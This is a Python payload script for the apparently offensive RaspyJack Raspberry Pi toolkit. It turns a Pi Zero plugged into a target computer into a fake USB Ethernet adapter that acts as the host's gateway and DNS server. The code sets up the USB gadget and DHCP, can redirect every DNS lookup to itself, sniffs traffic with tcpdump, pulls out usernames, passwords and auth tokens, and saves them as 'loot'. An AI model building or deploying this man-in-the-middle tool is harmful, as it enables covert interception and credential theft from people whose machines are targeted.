#!/usr/bin/env python3
"""
RaspyJack Payload -- USB Ethernet MITM
========================================
Author: 7h30th3r0n3

Configure the Pi as a USB RNDIS/ECM Ethernet adapter using configfs.
When plugged into a target host, all traffic flows through the Pi
enabling DNS spoofing, credential sniffing, and response injection.

Setup / Prerequisites:
  - Requires Pi Zero USB OTG port connected to target.
  - Configures RNDIS+ECM gadget. Target sees Pi as USB Ethernet adapter.
  - Requires dnsmasq.

Steps:
  1) Configure USB gadget as RNDIS/ECM Ethernet adapter
  2) Assign IP and start dnsmasq for DHCP
  3) Act as default gateway for the target
  4) Optionally spoof DNS and sniff credentials

Controls:
  OK        -- Start gadget / stop gadget
  KEY1      -- Toggle DNS spoof mode
  KEY2      -- Show captured data
  KEY3      -- Exit + cleanup gadget

Loot: /root/Raspyjack/loot/USBEthMITM/
"""

import os
import sys
import re
import json
import time
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/USBEthMITM"
os.makedirs(LOOT_DIR, exist_ok=True)

GADGET_BASE = "/sys/kernel/config/usb_gadget"
GADGET_NAME = "raspyjack_eth"
DNSMASQ_CONF = "/tmp/raspyjack_usbeth_dnsmasq.conf"
USB_IFACE = "usb0"
GATEWAY_IP = "10.0.88.1"
DHCP_RANGE_START = "10.0.88.10"
DHCP_RANGE_END = "10.0.88.50"
DNS_LOG = "/tmp/raspyjack_usbeth_dns.log"
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
gadget_running = False
dns_spoof_enabled = False
status_msg = "Idle"
view_mode = "main"       # main | captured
scroll_pos = 0
host_ip = ""
packets_captured = 0
dns_queries = []         # list of dicts: {timestamp, query, source}
captured_creds = []      # list of dicts: {timestamp, type, data}

_dnsmasq_proc = None
_sniffer_proc = None
_dns_monitor_thread = None

# ---------------------------------------------------------------------------
# File helpers
# ---------------------------------------------------------------------------

def _write_file(path, content):
    """Write content to a sysfs/configfs file."""
    try:
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# USB Gadget setup (RNDIS/ECM)
# ---------------------------------------------------------------------------

def _setup_gadget():
    """Configure USB Ethernet gadget (RNDIS + ECM) via configfs."""
    global gadget_running, status_msg

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)

    if os.path.isdir(gadget_dir):
        with lock:
            gadget_running = True
            status_msg = "Gadget already configured"
        return True

    with lock:
        status_msg = "Configuring gadget..."

    try:
        os.makedirs(gadget_dir, exist_ok=True)
        _write_file(os.path.join(gadget_dir, "idVendor"), "0x1d6b")
        _write_file(os.path.join(gadget_dir, "idProduct"), "0x0137")
        _write_file(os.path.join(gadget_dir, "bcdDevice"), "0x0100")
        _write_file(os.path.join(gadget_dir, "bcdUSB"), "0x0200")
        _write_file(os.path.join(gadget_dir, "bDeviceClass"), "0x02")
        _write_file(os.path.join(gadget_dir, "bDeviceSubClass"), "0x00")
        _write_file(os.path.join(gadget_dir, "bDeviceProtocol"), "0x00")

        # Strings
        strings_dir = os.path.join(gadget_dir, "strings", "0x409")
        os.makedirs(strings_dir, exist_ok=True)
        _write_file(os.path.join(strings_dir, "serialnumber"), "000000000002")
        _write_file(os.path.join(strings_dir, "manufacturer"), "Linux")
        _write_file(os.path.join(strings_dir, "product"), "USB Ethernet")

        # RNDIS function
        rndis_dir = os.path.join(gadget_dir, "functions", "rndis.usb0")
        os.makedirs(rndis_dir, exist_ok=True)

        # ECM fallback function
        ecm_dir = os.path.join(gadget_dir, "functions", "ecm.usb0")
        os.makedirs(ecm_dir, exist_ok=True)

        # Config 1: RNDIS (Windows)
        config1_dir = os.path.join(gadget_dir, "configs", "c.1")
        config1_strings = os.path.join(config1_dir, "strings", "0x409")
        os.makedirs(config1_strings, exist_ok=True)
        _write_file(os.path.join(config1_dir, "MaxPower"), "250")
        _write_file(os.path.join(config1_strings, "configuration"), "RNDIS")

        rndis_link = os.path.join(config1_dir, "rndis.usb0")
        if not os.path.exists(rndis_link):
            os.symlink(rndis_dir, rndis_link)

        # Config 2: ECM (macOS/Linux)
        config2_dir = os.path.join(gadget_dir, "configs", "c.2")
        config2_strings = os.path.join(config2_dir, "strings", "0x409")
        os.makedirs(config2_strings, exist_ok=True)
        _write_file(os.path.join(config2_dir, "MaxPower"), "250")
        _write_file(os.path.join(config2_strings, "configuration"), "ECM")

        ecm_link = os.path.join(config2_dir, "ecm.usb0")
        if not os.path.exists(ecm_link):
            os.symlink(ecm_dir, ecm_link)

        # Bind to UDC
        udc_list = os.listdir("/sys/class/udc")
        if udc_list:
            _write_file(os.path.join(gadget_dir, "UDC"), udc_list[0])

        time.sleep(1)

        # Configure network interface
        subprocess.run(
            ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", USB_IFACE],
            capture_output=True, timeout=5,
        )
        subprocess.run(
            ["sudo", "ip", "link", "set", USB_IFACE, "up"],
            capture_output=True, timeout=5,
        )

        with lock:
            gadget_running = True
            status_msg = "Gadget configured"
        return True

    except Exception as exc:
        with lock:
            status_msg = f"Gadget err: {str(exc)[:16]}"
        return False


def _teardown_gadget():
    """Remove USB Ethernet gadget."""
    global gadget_running

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)
    if not os.path.isdir(gadget_dir):
        return

    try:
        _write_file(os.path.join(gadget_dir, "UDC"), "")
        time.sleep(0.3)

        # Remove symlinks
        for link in [
            "configs/c.1/rndis.usb0",
            "configs/c.2/ecm.usb0",
        ]:
            path = os.path.join(gadget_dir, link)
            if os.path.islink(path):
                os.unlink(path)

        # Remove directories in reverse order
        for subdir in [
            "configs/c.2/strings/0x409",
            "configs/c.2",
            "configs/c.1/strings/0x409",
            "configs/c.1",
            "functions/rndis.usb0",
            "functions/ecm.usb0",
            "strings/0x409",
        ]:
            path = os.path.join(gadget_dir, subdir)
            if os.path.isdir(path):
                try:
                    os.rmdir(path)
                except OSError:
                    pass

        try:
            os.rmdir(gadget_dir)
        except OSError:
            pass
    except Exception:
        pass

    with lock:
        gadget_running = False


# ---------------------------------------------------------------------------
# dnsmasq / DHCP
# ---------------------------------------------------------------------------

def _start_dnsmasq():
    """Start dnsmasq as DHCP server + optional DNS spoof."""
    global _dnsmasq_proc, status_msg

    with lock:
        spoof = dns_spoof_enabled

    conf_lines = [
        f"interface={USB_IFACE}",
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},255.255.255.0,12h",
        f"dhcp-option=3,{GATEWAY_IP}",
        f"dhcp-option=6,{GATEWAY_IP}",
        "no-resolv",
        f"log-queries",
        f"log-facility={DNS_LOG}",
    ]

    if spoof:
        conf_lines.append(f"address=/#/{GATEWAY_IP}")
    else:
        conf_lines.append("server=8.8.8.8")

    with open(DNSMASQ_CONF, "w") as f:
        f.write("\n".join(conf_lines) + "\n")

    subprocess.run(["sudo", "killall", "dnsmasq"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)

    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # Enable IP forwarding
    subprocess.run(
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
        capture_output=True, timeout=5,
    )

    # NAT
    subprocess.run(
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-o", "eth0", "-j", "MASQUERADE"],
        capture_output=True, timeout=5,
    )

    with lock:
        status_msg = "DHCP active"


def _stop_dnsmasq():
    """Stop dnsmasq."""
    global _dnsmasq_proc

    if _dnsmasq_proc is not None:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    subprocess.run(["sudo", "killall", "-9", "dnsmasq"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iptables", "-F"],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
        capture_output=True, timeout=5,
    )


# ---------------------------------------------------------------------------
# Traffic sniffer (lightweight tcpdump)
# ---------------------------------------------------------------------------

def _start_sniffer():
    """Start a lightweight packet sniffer on USB interface."""
    global _sniffer_proc

    try:
        _sniffer_proc = subprocess.Popen(
            ["sudo", "tcpdump", "-i", USB_IFACE, "-l", "-n",
             "-c", "10000", "-q"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
        )
        threading.Thread(target=_sniffer_read_loop, daemon=True).start()
    except Exception:
        pass


def _sniffer_read_loop():
    """Read tcpdump output and count packets."""
    global packets_captured

    while True:
        with lock:
            if not gadget_running:
                break
        try:
            line = _sniffer_proc.stdout.readline()
        except Exception:
            break
        if not line:
            if _sniffer_proc.poll() is not None:
                break
            continue
        with lock:
            packets_captured += 1

        # Extract credential-like patterns (very basic)
        _check_for_creds(line)


def _check_for_creds(line):
    """Basic credential detection in packet output."""
    lower = line.lower()
    patterns = [
        (r"user(?:name)?[=:]\s*(\S+)", "username"),
        (r"pass(?:word)?[=:]\s*(\S+)", "password"),
        (r"auth[=:]\s*(\S+)", "auth_token"),
    ]
    for pattern, cred_type in patterns:
        match = re.search(pattern, lower)
        if match:
            entry = {
                "timestamp": datetime.now().isoformat(),
                "type": cred_type,
                "data": match.group(1)[:64],
            }
            with lock:
                captured_creds.append(entry)


def _stop_sniffer():
    """Stop the packet sniffer."""
    global _sniffer_proc
    if _sniffer_proc is not None:
        try:
            _sniffer_proc.terminate()
            _sniffer_proc.wait(timeout=3)
        except Exception:
            try:
                _sniffer_proc.kill()
            except Exception:
                pass
        _sniffer_proc = None


# ---------------------------------------------------------------------------
# DNS log monitor
# ---------------------------------------------------------------------------

def _start_dns_monitor():
    """Monitor DNS log for queries."""
    global _dns_monitor_thread
    _dns_monitor_thread = threading.Thread(target=_dns_monitor_loop, daemon=True)
    _dns_monitor_thread.start()


def _dns_monitor_loop():
    """Tail the DNS log file for queries."""
    last_pos = 0
    while True:
        with lock:
            if not gadget_running:
                break
        try:
            if os.path.isfile(DNS_LOG):
                with open(DNS_LOG, "r") as f:
                    f.seek(last_pos)
                    new_lines = f.readlines()
                    last_pos = f.tell()

                for line in new_lines:
                    if "query[" in line:
                        # Extract query name
                        match = re.search(r"query\[A\]\s+(\S+)", line)
                        if match:
                            entry = {
                                "timestamp": datetime.now().isoformat(),
                                "query": match.group(1),
                                "source": "dns",
                            }
                            with lock:
                                dns_queries.append(entry)
                                if len(dns_queries) > 500:
                                    dns_queries.pop(0)
        except Exception:
            pass
        time.sleep(1)


# ---------------------------------------------------------------------------
# Detect connected host
# ---------------------------------------------------------------------------

def _detect_host_ip():
    """Detect connected host IP from DHCP leases."""
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        return parts[2]
    except Exception:
        pass
    return ""


# ---------------------------------------------------------------------------
# Start / Stop full attack
# ---------------------------------------------------------------------------

def start_gadget():
    """Start the full USB Ethernet MITM chain."""
    global status_msg

    if not _setup_gadget():
        return

    with lock:
        status_msg = "Starting DHCP..."
    _start_dnsmasq()
    _start_sniffer()
    _start_dns_monitor()

    with lock:
        status_msg = "MITM active"


def stop_gadget():
    """Stop everything and clean up."""
    global gadget_running, status_msg

    with lock:
        status_msg = "Stopping..."

    _stop_sniffer()
    _stop_dnsmasq()
    _teardown_gadget()

    for fpath in (DNSMASQ_CONF, DNS_LOG):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        gadget_running = False
        status_msg = "Stopped"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export all captured data to loot."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    with lock:
        data = {
            "timestamp": ts,
            "packets_captured": packets_captured,
            "dns_queries": list(dns_queries[-100:]),
            "captured_creds": list(captured_creds),
            "dns_spoof": dns_spoof_enabled,
        }
    path = os.path.join(LOOT_DIR, f"usbeth_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_header(d, title):
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), title, font=font, fill="#00CCFF")
    with lock:
        active = gadget_running
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#FF0000")


def _draw_footer(d, text):
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), text[:24], font=font, fill="#AAA")


def draw_main_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "USB ETH MITM")

    with lock:
        msg = status_msg
        running = gadget_running
        spoof = dns_spoof_enabled
        pkts = packets_captured
        dns_count = len(dns_queries)
        cred_count = len(captured_creds)

    current_host = _detect_host_ip() if running else ""

    y = 18
    d.text((2, y), msg[:22], font=font, fill="#00FF00" if running else "#FF4444")
    y += 14
    d.text((2, y), f"Host: {current_host or 'waiting...'}", font=font, fill="white")
    y += 14
    d.text((2, y), f"Packets: {pkts}", font=font, fill="#CCCCCC")
    y += 14
    d.text((2, y), f"DNS queries: {dns_count}", font=font, fill="#FFAA00")
    y += 14
    d.text((2, y), f"Creds found: {cred_count}", font=font, fill="#FF4444")
    y += 14
    spoof_label = "ON" if spoof else "OFF"
    spoof_color = "#00FF00" if spoof else "#888"
    d.text((2, y), f"DNS Spoof: {spoof_label}", font=font, fill=spoof_color)

    label = "OK:Stop" if running else "OK:Start"
    _draw_footer(d, f"{label} K1:DNS K2:Data K3:X")
    LCD.LCD_ShowImage(img, 0, 0)


def draw_captured_view():
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    _draw_header(d, "CAPTURED DATA")

    with lock:
        creds = list(captured_creds)
        queries = list(dns_queries[-20:])
        sc = scroll_pos

    y = 18
    if creds:
        d.text((2, y), "-- Credentials --", font=font, fill="#FF4444")
        y += 12
        for cred in creds[-3:]:
            d.text((2, y), f"{cred['type']}: {cred['data'][:16]}", font=font, fill="#FFAA00")
            y += 12

    if queries:
        d.text((2, y), "-- DNS Queries --", font=font, fill="#00CCFF")
        y += 12
        visible = queries[sc:sc + 4]
        for q in visible:
            if y > 108:
                break
            d.text((2, y), q["query"][:22], font=font, fill="#888")
            y += 10

    _draw_footer(d, "UP/DN:Scroll K3:Back")
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global scroll_pos, view_mode, dns_spoof_enabled, status_msg

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "USB ETHERNET MITM", font=font, fill="#00CCFF")
    d.text((4, 36), "RNDIS/ECM gadget", font=font, fill="#888")
    d.text((4, 48), "Traffic interception", font=font, fill="#888")
    d.text((4, 66), "OK=Start K1=DNS Spoof", font=font, fill="#666")
    d.text((4, 78), "K2=Captured K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "captured":
                    with lock:
                        view_mode = "main"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                break

            if view_mode == "main":
                if btn == "OK":
                    with lock:
                        running = gadget_running
                    if running:
                        threading.Thread(target=stop_gadget, daemon=True).start()
                    else:
                        threading.Thread(target=start_gadget, daemon=True).start()
                    time.sleep(0.3)

                elif btn == "KEY1":
                    with lock:
                        dns_spoof_enabled = not dns_spoof_enabled
                        label = "ON" if dns_spoof_enabled else "OFF"
                        status_msg = f"DNS Spoof: {label}"
                    # Restart dnsmasq if running to apply change
                    with lock:
                        running = gadget_running
                    if running:
                        _stop_dnsmasq()
                        _start_dnsmasq()
                    time.sleep(0.25)

                elif btn == "KEY2":
                    with lock:
                        view_mode = "captured"
                        scroll_pos = 0
                    time.sleep(0.25)

                draw_main_view()

            elif view_mode == "captured":
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(
                            max(0, len(dns_queries) - 1), scroll_pos + 1
                        )
                    time.sleep(0.15)
                elif btn == "OK":
                    path = _export_data()
                    with lock:
                        status_msg = f"Saved: {os.path.basename(path)[:16]}"
                    time.sleep(0.3)

                draw_captured_view()

            time.sleep(0.05)

    finally:
        stop_gadget()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
